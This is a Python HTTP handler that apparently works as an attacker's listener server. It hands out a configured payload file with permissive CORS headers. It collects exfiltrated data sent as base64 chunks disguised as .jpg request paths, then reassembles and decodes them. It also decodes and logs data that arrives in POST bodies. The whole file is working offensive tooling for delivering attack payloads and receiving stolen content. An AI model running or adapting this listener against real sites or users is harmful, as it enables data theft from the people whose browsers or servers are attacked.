from urllib.parse import urlparse
from http.server import BaseHTTPRequestHandler
from base64 import b64decode
import re

from logger import logger, set_log_level, display_message

class Handler(BaseHTTPRequestHandler):

  def log_message(self, format, *args):
    request = "%s - - [%s] %s" % (self.client_address[0], self.log_date_time_string(), format%args)
    display_message(request, options={"text":"green","attrs":["bold"]})
    headers = str(self.headers).strip()
    display_message("Request headers", headers)

  def _set_defaults(self):
    self.server_version = 'null'
    self.sys_version = 'null'

  def _cors_headers(self):
    self.send_header('Access-Control-Allow-Origin', '*')
    # probably overkill
    self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    self.send_header('Access-Control-Allow-Credentials', 'true')
    self.send_header("Access-Control-Allow-Headers", "X-Requested-With")
    self.send_header("Access-Control-Allow-Headers", "Content-Type")

  def _each_request(self):
    self._set_defaults()
    self._cors_headers()

  def _send_payload(self):
    logger.info("Sending payload...")
    self.wfile.write(self.server.payload.encode('utf-8'))

  exfil_data = {} # needs to persist across requests
  def _do_exfil(self):
    logger.debug("Handling exfil chunk...")

    request = urlparse(self.path).path
    regex = "exfil\/([^\/]+)\/(.*).jpg"
    match = re.search(regex,request)
    k,v = match.group(1),match.group(2)
    self.exfil_data[k] = v

    if k == 'LAST': # finalize and log
      logger.info("Finalizing exfil...")
      b64data = ""
      for k in sorted(self.exfil_data):
        logger.debug(f"exfil chunk {k}: {self.exfil_data[k]}")
        b64data = b64data + self.exfil_data[k]
      content = b64decode(b64data, validate=True).decode().strip()
      display_message("Got exfil content", content, {"text":"green"})
      self.exfil_data = {} # clear it

  def do_GET(self):
    self.send_response(201)
    self._each_request()
    self.send_header('Content-Type', self.server.contenttype)
    self.end_headers()

    request = urlparse(self.path).path
    # if the request is for our payload 
    payload = f"/{self.server.filename}"
    if request == payload:
      self._send_payload()
    # if the request is exfiltrating content
    elif request.startswith("/exfil"):
      self._do_exfil()
    # otherwise, don't do anything

  def do_POST(self):
    self.send_response(201)
    self._each_request()
    self.send_header('Content-Type', self.server.contenttype)
    self.end_headers()

    request = urlparse(self.path).path
    # I actually don't know if you'd ever want to do this
    payload = f"/{self.server.filename}"
    if request == payload:
      self._send_payload()

    content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
    if content_length > 0:
      post_data = self.rfile.read(content_length) # <--- Gets the data itself
      # if it's base64 decode it and log it, otherwise just log it
      try:
        out = b64decode(post_data).decode('utf-8')
        title = f"Got POST data from base64 (length {content_length})"
        message = out.replace('\\n','\n').strip() # placeholder newlines in default payload - probably a better way to do this
        display_message(title, message, {"text":"green"})
      except:
        title = f"Got POST data raw (length {content_length})"
        message = f"{post_data.strip()}"
        display_message(title, message, {"text":"green"})

  # just in case we need to support a preflight
  def do_OPTIONS(self):
    self.send_response(201)
    self.end_headers()
